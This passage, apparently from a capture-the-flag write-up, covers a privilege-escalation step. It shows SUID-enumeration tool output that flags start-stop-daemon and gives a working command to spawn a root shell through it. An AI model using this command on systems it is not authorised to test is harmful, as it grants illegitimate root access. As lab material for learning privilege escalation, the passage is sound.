# 6 privesc > root

```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/sbin/start-stop-daemon
------------------------------


[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/usr/sbin/start-stop-daemon -~> https://gtfobins.github.io/gtfobins/start-stop-daemon/#suid
------------------------------


[$] Please try the command(s) below to exploit harmless SUID bin(s) found !!!
------------------------------
[~] /usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
------------------------------
```
